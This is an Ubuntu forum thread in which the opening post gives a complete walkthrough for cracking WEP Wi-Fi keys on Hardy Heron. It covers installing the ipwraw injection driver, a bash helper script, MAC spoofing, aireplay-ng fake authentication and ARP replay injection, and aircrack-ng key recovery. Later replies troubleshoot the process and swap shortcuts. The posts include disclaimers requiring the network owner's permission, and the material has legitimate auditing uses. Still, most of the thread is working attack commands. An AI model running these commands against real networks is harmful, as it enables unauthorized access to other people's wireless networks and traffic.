---
title: "WEP cracking under Hardy Heron, using ipwraw driver"
date: 2008-05-02
forum: Networking &amp; Wireless
---

### Post by qsr.nrwn on 2008-05-02
[SIZE="7"]WEP Cracking under Hardy Heron using ipwraw driver[/SIZE]
[SIZE="6"][COLOR="Red"]FIRST READ IT:[/COLOR][/SIZE]

Quoting XAsmodeanX:
> 
There is nothing inherently wrong with penetration testing your own networks, and it is not illegal to possess or use any of the tools in my tutorial.
Following the logic that some linux applications can be misused, and that they are made for linux, then linux can be misused. Of course, even though linux can be a powerful tool or a "weapon" in the hands of some, all linux discussion should not be removed simply because of the possibility of misuse.
Providing people with the tools and knowledge to understand their own networks is a crucial step in the road to having better security. If you don't understand a problem, you can't give a solution. The more that people know and understand how the WEP encryption scheme is broken, the better they can protect themselves by using WPA or another standard that is more secure.

[SIZE="6"][COLOR="Red"]DISCLAIMER:[/COLOR][/SIZE]
Citing another one, which I cannot remember:
> 
Note that you need formal permission from the owner of any wireless network you wish to audit. Under no circumstances must you compromise a network's security prior to obtaining approval from the owner of the network, and no support will be given to users who seek to do otherwise.

[SIZE="6"][COLOR="Red"]NOTICE:[/COLOR][/SIZE]

Your computer may become unstable and even have a hard-lock [that it seems to be related to injection speed, it is more prone to crash with 54M speed than 1M speed] (you will need to do a hard reset on your machine, I can tell you from my own experience while trying to do this). I recommend to take enough measures to safe-guard your data just in case you have to reinstall your OS, and [COLOR="Red"]PLEASE DO NOT TRY THIS AT PRODUCTION MACHINES.[/COLOR]

Please note that I'm using the ipwraw, which now is deprecated since I was not able to find enough information on how to do packet injection under the new drivers. 

[SIZE="5"]A not so long trip... - Starting:[/SIZE]

I am aware that there are many ways to accomplish WEP cracking, after you can perform injection, such as kismet, and others, but this is the way it worked for me since Gutsy Gibbon, but now I have managed to make it work for Hardy Heron.

One main issue since the shipping of Intel PRO/Wireless 3945ABG WLAN (802.11a/b/g) was to make it even work with Linux. One effort (now deprecated) was the project hosted at [http://ipw3945.sourceforge.net/](http://ipw3945.sourceforge.net/) in which they offered a driver that in order to use you needed a binary microcode, a binary user space regulatory daemon, the ieee80211 subsystem, a linux kernel >= 2.6.13, wireless extensions and tools and a module WPA supplicant [this will not be covered in this walk-trough].

Now that effort have been deprecated in favour of the iwlwifi drivers (you can read the history here: [http://intellinuxwireless.org/?p=iwlwifi](http://intellinuxwireless.org/?p=iwlwifi)). As far as I am aware, they support the Intel PRO/Wireless 3945ABG WLAN (802.11a/b/g) out of the box.

But...

There is always a but. In order to support packet injection, the problems arised. Some distros (wifiway, if my memory is not so bad), and some websites (seguridadwireless.com, if my memory is not that bad) showed us how to patch the drivers, those steps have been ported to almost any linux distro. With the binary drivers (ipw3945), and using the ipwraw hosted at [http://homepages.tu-darmstadt.de/~p_larbig/wlan/](http://homepages.tu-darmstadt.de/~p_larbig/wlan/) you were able to perform packet injection.

Well, if you used those drivers, [almost] all was OK. When I installed Ubuntu Hardy Heron, I was so happy that the ipw3945 have been gone and that the iwlwifi driver was on command now, until... I tried to test packet injection. No one thing worked. For almost a day or two (I cannot recall total time... ;)) I googled the WWW in order to find a possible solution. No luck, i just find nothing/nada [Did I have entered the correct google search terms? Perhaps]. I just stumbled with some useful pages, indeed. Some of them uncovered that puzzle a little, and finally I was enlightened... [just joking in the enlightenment part]. This is a not standard way... as you will see...

The issue covering this walk-through, is to make under Hardy Heron the Intel 3945 chipset do packet injection, using the ipwraw driver provided by p_larbig, on a Hardy Heron. I'm working on various assumptions:

[LIST]
[*]you have managed to patch ipw3945 drivers, previously
[*]you own a linux machine with Hardy Heron freshly installed, I have neither the time or will to test on an upgraded system
[*]you have managed to compile/install previous versions of the ipwraw driver
[*]you know how to use aircrack-ng
[*]you own a WEP (Weak Encryption Protocol, ;)) network
[*]you can use CLI (ahhhhhhhh, linux, your CLI, a powerful tool and a headache)
[*]the CAPITAL LETTERS in the cracking WEP key part act as placeholders for
[LIST]
[*]CHANNEL, the channel which will be sniffed/injected
[*]FILE, a file name
[*]ESSID, the access point name such as WEIRDNET, INFINITAS, DREAMRYCHE
[*]BSSID, the access point address
[*]MACADDRESS, your wifi mac address
[/LIST]
[*]you are using it under your own risk
[*]you know what the hell are you doing
[/LIST]

[SIZE="5"]A not so long trip... - Hands on:[/SIZE]
You will need to type (or copy-past on CLI) the following
[SIZE="4"]Installing part:[/SIZE]
```
sudo apt-get install linux-headers-`uname -r` build-essential libssl-dev macchanger 
wget [http://homepages.tu-darmstadt.de/~p_larbig/wlan/ipwraw-ng-2.3.4-04022008.tar.bz2](http://homepages.tu-darmstadt.de/~p_larbig/wlan/ipwraw-ng-2.3.4-04022008.tar.bz2)
tar -xjf ipwraw-ng*
cd ipwraw-ng
make
sudo make install
sudo make install_ucode
echo "blacklist ipwraw" | sudo tee /etc/modprobe.d/ipwraw
sudo depmod -ae
```
[SIZE="4"]The non standard way:[/SIZE]
open gedit, copy and paste the following
```
#!/bin/bash

clear
echo "Please provide the wifi0 CHANNEL"
read canal
echo "Please provide the capture rate (best results with only 2)"
read rate
echo "Please provide the target BSSID"
read bssid
ifconfig wifi0 down
chmod u+wrx /sys/class/net/wifi0/device/rate
echo $rate >/sys/class/net/wifi0/device/rate
echo $canal >/sys/class/net/wifi0/device/channel
echo $bssid >/sys/class/net/wifi0/device/bssid
ifconfig wifi0 up
echo "Configuration completed. Ready to do packet injection"
``` 
Save it under a wise name such as: wepcrackconf.sh or so and give it run permisision by issuing
```
sudo chmod +x wepcrackconf.sh
```
[SIZE="4"]Unloading/loading drivers:[/SIZE]
```
sudo modprobe -r iwl3945
sudo modprobe ipwraw

```
[SIZE="4"]Cracking part:[/SIZE]
open four terminals
[SIZE="3"]first terminal[/SIZE]
```
sudo iwconfig wifi0 rate 1M
sudo airodump-ng wifi0
```
[SIZE="3"]second terminal[/SIZE]
```
sudo su
./wepcrackconf.sh
```
[LIST]
[*]channel, pick the channel you wish
[*]rate always 2
[*]bssid, taken from previous terminal
[/LIST]
```
exit
sudo airodump-ng -c CHANNEL -w FILE wifi0

```
[SIZE="3"]third terminal[/SIZE]
```
sudo macchanger -s wifi0
sudo aireplay-ng -1 10 -e "ESSID" -a BSSID -h MACADDRESS wifi0
```
[SIZE="3"]fourth terminal[/SIZE]
```
sudo aireplay-ng -3 -b BSSID -h MACADDRESS wifi0
```
[SIZE="3"]back on first terminal[/SIZE]
After you have gathered enough IV's stop command running with a Ctrl-C keystroke and issue
```
sudo aircrack-ng FILE.cap
```
[SIZE="4"]Unloading/loading drivers:[/SIZE]
```
sudo modprobe -r ipwraw
sudo modprobe iwl3945
```
[SIZE="4"]A not so long trip... - Comments:[/SIZE]
[LIST]
[*]the shell is now dash not bash, in the compiling part will complaint about it, but it seems to compile the ipwraw driver well
[*]sudo make install, under the installing part seems to be aware of the firmware status (patched?/not patched?)
[*] sudo make install_ucode, same as above
[*]In the non standard way make sure that the quotes are CLI quotes (straight quotes), not typographical ones
[*]In the non standard way I'm using the root powers to accomplish it. If you know another way to set the values, please let me know.
[*]On the cracking part, fourth terminal[LIST]
[*]you probably get a message stating something as "20:45:20  wifi0 is on channel 13, but the AP uses channel 6", just reissue it
[*]gather at least 500,000 packets, to crack a WEP 64-bit Hex (This is no longer the case since the new ptw attack (which is built into aircrack-ng, and used by your instructions) These days, anything between 20,000 and 50,000 packets will have success cracking 128 bit wep!) <- Thanks Noahod
[/LIST]

[*]you can change the MAC address just read the macchanger info or man page
[/LIST]
[SIZE="4"]A not so long trip... - Troubleshooting:[/SIZE]
[LIST]
[*]echo "blacklist ipwraw" | sudo tee /etc/modprobe.d/ipwraw, seems not to be blacklisting ipwraw module, just check that are CLI quotes NOT typographical quotes, and issue the command again
[*]If you cannot connect (after issuing all the commands or after a hard resent), just disable the ipw drivers and restart :(
[/LIST]
[SIZE="4"]A not so long trip... - ACKs and references:[/SIZE]
In no particular order[LIST]
[*][http://intellinuxwireless.org/?p=iwlwifi](http://intellinuxwireless.org/?p=iwlwifi)
[*][http://ipw3945.sourceforge.net/](http://ipw3945.sourceforge.net/)
[*][http://tinyshell.be/aircrackng/forum/index.php?topic=2898](http://tinyshell.be/aircrackng/forum/index.php?topic=2898)
[*][http://forums.remote-exploit.org/showthread.php?t=13096](http://forums.remote-exploit.org/showthread.php?t=13096)
[*][http://ubuntuforums.org/showthread.php?t=514723](http://ubuntuforums.org/showthread.php?t=514723)
[*][http://neodian.blogsome.com/2007/12/21/instalar-ipwraw-para-intel-3945/](http://neodian.blogsome.com/2007/12/21/instalar-ipwraw-para-intel-3945/)
[*][http://aircrack-ng.org/doku.php?id=ipw3945](http://aircrack-ng.org/doku.php?id=ipw3945)
[*] man and info pages
[/LIST]
[SIZE="4"]A not so long trip... - Misc:[/SIZE]
English is not my mother tongue, please be gentle with some grammatical errors. PM me and I will correct them ASAP.
Based loosely on the XAsmodeanX tutorial ([http://ubuntuforums.org/showthread.php?t=514723](http://ubuntuforums.org/showthread.php?t=514723))
[SIZE="4"]A not so long trip... - Updates[/SIZE]
[LIST]
[*]There is a tool called wesside-ng which is in beta in the aircrack-ng suite. Performs all the operations required to crack a WEP key, but is quite IMHO unstable. It gave me 2 hard-locks in a row.
[*]If you fail to reduce the capture rate the computer may crash... hard-learned by myself
[/LIST]

---

### Post by ICU2 on 2008-05-02
excellent post, kind of figured out myself recently, but is much of what i did, hope this works for everyone:popcorn:

---

### Post by DarkNekoRockman on 2008-05-02
Eres un master, he vuelto a obtener los drivers ipwraw gracias a ti, una excelente solución rapida y facil.  :guitar:

---

### Post by DarioA on 2008-05-03
Hi!
Was great to find someone that's having the same problem as me, but decided to solve it. 
I also would like to ask you if you know that this should works with airoway script.

---

### Post by cracker on 2008-05-03
Thanks for the info, I have one of the new intel wireless N cards, and this helped me use aircrack. However, my process was much simpler, as the default driver in 8.04 supports monitor mode. Here's what I did, effectively:

```

sudo apt-get install aircrack-ng
sudo killall NetworkManager        # causes issues if you leave it running
sudo iwconfig wlan0 mode Monitor
sudo airodump-ng -w dumpfile wlan0
```
In a second terminal:

```

sudo aircrack-ng dumpfile-01.cap
```

You can leave both programs running simultaneously, and aircrack will keep trying again and again as you gather more IVs until it cracks the key. This method means you just set it up and wait for the packets to fly.

Again, thanks for the tips, I couldn't have figured this out without this post. I figured my experience was worth sharing.

---

### Post by qsr.nrwn on 2008-05-03
> **DarioA said:**
> Hi!
I also would like to ask you if you know that this should works with airoway script.

To which airoway script (there are lurking some on the internet) are you refering? Please post a link to the page [first guess: wifiway? [http://foro.seguridadwireless.net/index.php/topic,4093.0.html]](http://foro.seguridadwireless.net/index.php/topic,4093.0.html]) that host that script and let me try it to give you further advise, about its drawbacks [if any] and about the configuration.

---

### Post by qsr.nrwn on 2008-05-03
> **cracker said:**
> 
You can leave both programs running simultaneously, and aircrack will keep trying again and again as you gather more IVs until it cracks the key. This method means you just set it up and wait for the packets to fly.

Leaving card in monitor mode, on your method, is quite useful only when you want to passively record all the packets but gathering all the needed packets can be a loooooooong process unless you are planning to use aircrack-ptw and wesside-ng approach, and as is stated in [http://wiki-files.aircrack-ng.org/doc/Final-Nail-in-WEPs-Coffin.slides.pdf](http://wiki-files.aircrack-ng.org/doc/Final-Nail-in-WEPs-Coffin.slides.pdf), 21st slide, the numbers are as high as 100,000 to crack a 64 Hex-bit key.

I tried your suggestion, and it collected about ~50 data packets in 16 minutes. With injection, you can collect about 500,000 in the same time. The whole point to inject traffic on the network is to speed up the process, so this is the reason the ipwraw driver is needed, to send  raw packets as is described in [http://www.security-freak.net/packet-injection/packet-injection.html](http://www.security-freak.net/packet-injection/packet-injection.html)

---

### Post by cracker on 2008-05-03
I see what you mean. However, it doesn't really take that long if there's a client on the network. I cracked my own key with only 20,000 IVs, and with only one client on the network, surfing the web, it took less than fifteen minutes. Though, I can see how generating your own traffic would speed up the process, especially if there aren't any clients using the network.

---

### Post by pmq on 2008-05-14
Hi, 
Im rather new to this so forgive more the newbie question.

I have been playing around with aircrack with no success only to realise that my driver is the ipw3945. The ipwraw is a great solution for use with this as i understand aircrack does not support 3945. Im a bit slow because it took me ages to realise this :(.

I have done everything down to the crack part.

I have a question about placeholders. Where do i get the information for channel and the macaddress (correct me if im wrong but is that through the iwconfig command?), also as regards to the file name, can this be of my choice? and does the file be saved, if so is there a good directory it can go or does it go in the /ipwraw directory.

thanks.

---

### Post by mrbuntuman on 2008-05-14
1st off, great post, good work on getting it done,ipwraw driver has only one side effect, to get the best on it u must set ur network manger(ie: manual network configuration)  in manual config and set it to roaming mode.

Once u do that follow this post and ur skyling.

once again good work

cheer all

---

### Post by qsr.nrwn on 2008-05-16
> **pmq said:**
> 
Where do i get the information for channel and the macaddress (correct me if im wrong but is that through the iwconfig command?)

Yes you can grab the Access Point address and ESSID from iwconfig. The channel is provided when you run
```
sudo airodump-ng wifi0
```
please be aware that the channel, ESSID, and BSSID (AP adress) must match
the MACADDRESS is fetched when you run the
```

sudo macchanger -s wifi0

```
where the MACADDRESS of your wireless interfaces is showed, since there is the chance that you have set the MACADDRESS through macchanger.
> **pmq said:**
> 
, also as regards to the file name, can this be of my choice? and does the file be saved, if so is there a good directory it can go or does it go in the /ipwraw directory.

the filename and its location can be of your choice, as an example you can locate it at "~/WEP\ Cracking", in fact if you provide just the name it stores the capture file in the current working directory.

---

### Post by pmq on 2008-05-18
Thanks that was very helpful.

Also just to let you know, when running aircrack-ng <file>.cap results seemed to take forever. However, when i used the PTW on the aircrack, this seemed to provide results by simply using -z.
This has really educated me as i have just realised my network wasn't on typical 128bit wep however it was only on a mere 64bit. I doubt it makes much difference since wep is so weak overall. 
I am going to set up a WPA encryption, however it is only going to be the original WPA, i cannot initialise WPA2 on my network router, there is no option, i think its because my router is years old. Time to upgrade i feel :).

pmq

---

### Post by doublearon on 2008-05-20
So when do you know if it's "cracked"? I did everything in the first post and I couldn't tell what was going on really.

---

### Post by Noahod on 2008-05-23
Awesome, thanks for this guide. It's taken me so long and so many hours to get to this stage. Worked flawlessly.

EDIT:
PS: aircrack-ng these days uses ptw attack, which reduces keys needed to < 50,000. I cracked wep in 1min 44sec using your guide.

---

### Post by Ryan90 on 2008-06-17
Hey, as you can see, I'm quite new to ubuntu. I've done a few tutorials and such, and now trying to get this going. I follow you all the way up to "sudo iwconfig wifi0 rate 1M" when i get an error saying I have no such device. What would be causing this?

---

### Post by qsr.nrwn on 2008-06-23
> **Ryan90 said:**
> Hey, as you can see, I'm quite new to ubuntu. I've done a few tutorials and such, and now trying to get this going. I follow you all the way up to "sudo iwconfig wifi0 rate 1M" when i get an error saying I have no such device. What would be causing this?

First of all, excuse me if I haven't answered so quickly... I was a little busy (And I will be more busy). The first candidate for your error is that you have not loaded the ipwraw module, that provides the wifi0 interface... I hope this helps you. If not, drop me a line so we can troubleshoot it...

---

### Post by qsr.nrwn on 2008-06-24
> **doublearon said:**
> So when do you know if it's "cracked"? I did everything in the first post and I couldn't tell what was going on really.

Same as above, I was so busy so I wasn't paying too much attention to this thread... there is a detailed guide at [http://aircrack-ng.org/doku.php?id=newbie_guide]("http://aircrack-ng.org/doku.php?id=newbie_guide")... It helped me a lot

---

### Post by LIn_gr_wir on 2008-08-10
Thnx for the walkthough, but there is a problem.
It all seems to be working well but i don't get enough packets.
In fact i get 50 packets/min.
But i've done all the steps and aireplay seems to have no prob.
I tried it on my own router, so there were no clients...
Help pls.

---

### Post by Noahod on 2008-08-10
> **LIn_gr_wir said:**
> Thnx for the walkthough, but there is a problem.
It all seems to be working well but i don't get enough packets.
In fact i get 50 packets/min.
But i've done all the steps and aireplay seems to have no prob.
I tried it on my own router, so there were no clients...
Help pls.

Did you have any computers on the network to respond to your arp requests? They don't have to be wireless clients but you do need at least one computer to respond. 

Failing that it could be either:

Failed association,
Failed injection,

or too far away from AP.

---

### Post by jetpeach on 2008-08-18
could the OP update the link in the wget code for downloading ipraw. it has changed
```
http://homepages.tu-darmstadt.de/~p_larbig/wlan/ipwraw-ng-2.3.4-04022008.tar.bz2
```

---

### Post by qsr.nrwn on 2008-08-27
> **jetpeach said:**
> could the OP update the link in the wget code for downloading ipraw. it has changed
```
http://homepages.tu-darmstadt.de/~p_larbig/wlan/ipwraw-ng-2.3.4-04022008.tar.bz2
```

Done.

---

### Post by b-boy on 2008-11-05
Nice post 


Just one problem for me is that when i run this command in the third terminal
```
sudo aireplay-ng -1 10 -e "ESSID" -a BSSID -h MACADDRESS wifi0
```

my pc sends a few authentication request than the pc just freezes. 
Why is it doing this?


all previous steps work fine

---

### Post by dublued on 2008-11-05
i was just about to raise this thread from the dead.  but i'm glad you did.

I tried to do this last night but it also keeps on freezing, but at the 4th terminal.

Any advice?  Thanks!

---

### Post by dublued on 2008-11-05
come to think of it.  it does happen due to sending a authentication request (terminal 3)

just as a precautionary measure i turned off compiz (sorry i'm a noob and not sure if it had anything to do with it at all)

I also did sudo killall NetworkManager because someone mentioned leaving that on can create problems.

---

### Post by b-boy on 2008-11-06
> **dublued said:**
> come to think of it.  it does happen due to sending a authentication request (terminal 3)

just as a precautionary measure i turned off compiz (sorry i'm a noob and not sure if it had anything to do with it at all)

I also did sudo killall NetworkManager because someone mentioned leaving that on can create problems.

I am a newb too anyway did it work with Network manager off?

---

### Post by dublued on 2008-11-06
No that didn't help.  I did some searching and someone mentioned to try the following:

```
sudo airmon-ng check
```

this will tell you all processes  that may cause it to freeze.  so then i executed

```
sudo kill PID1 PID2 PID3 etc...
```

I do this before i enter the information on terminal 3.

but that still didn't help.  it still freezes up upon injection.  

i also tried

```
sudo airmon-ng start wifi0 CHANNEL
```

but the interface is not listed for monitoring.

---

### Post by b-boy on 2008-11-07
> **dublued said:**
> No that didn't help.  I did some searching and someone mentioned to try the following:

```
sudo airmon-ng check
```

this will tell you all processes  that may cause it to freeze.  so then i executed

```
sudo kill PID1 PID2 PID3 etc...
```

I do this before i enter the information on terminal 3.

but that still didn't help.  it still freezes up upon injection.  

i also tried

```
sudo airmon-ng start wifi0 CHANNEL
```

but the interface is not listed for monitoring.



I will try the above but i also read a post that said we need to use later kernel 26.25XXX or 26.26XX the one in ubuntu8.10

---

### Post by ryu_hunter on 2011-05-16
jimmy@jimmy-EasyNote-MX45:~/Escritorio/IPWRAW2$ cd ipwraw-ng/
jimmy@jimmy-EasyNote-MX45:~/Escritorio/IPWRAW2/ipwraw-ng$ ls
ap-beacon            Intel_files  iwlwifi_hw.h  README.ipwraw-ng  ucode
CHANGELOG.ipwraw-ng  in-tree      kcompat       remove-old        util
config               ipwraw.c     LICENSE       scripts
dvals                ipwraw.h     LICENSE.GPL   snapshot
FILES                ISSUES       Makefile      status
jimmy@jimmy-EasyNote-MX45:~/Escritorio/IPWRAW2/ipwraw-ng$ make

WARNING: $SHELL not set to bash.
If you experience build errors, try
'make SHELL=/bin/bash'.

make -C /lib/modules/2.6.35-28-generic/build M=/home/jimmy/Escritorio/IPWRAW2/ipwraw-ng modules
make[1]: se ingresa al directorio «/usr/src/linux-headers-2.6.35-28-generic»

WARNING: $SHELL not set to bash.
If you experience build errors, try
'make SHELL=/bin/bash'.

  CC [M]  /home/jimmy/Escritorio/IPWRAW2/ipwraw-ng/ipwraw.o
/home/jimmy/Escritorio/IPWRAW2/ipwraw-ng/ipwraw.c:43: fatal error: net/ieee80211.h: No existe el fichero o el directorio
compilation terminated.
make[2]: *** [/home/jimmy/Escritorio/IPWRAW2/ipwraw-ng/ipwraw.o] Error 1
make[1]: *** [_module_/home/jimmy/Escritorio/IPWRAW2/ipwraw-ng] Error 2
make[1]: se sale del directorio «/usr/src/linux-headers-2.6.35-28-generic»
make: *** [modules] Error 2

what can i do???????????????????????

---

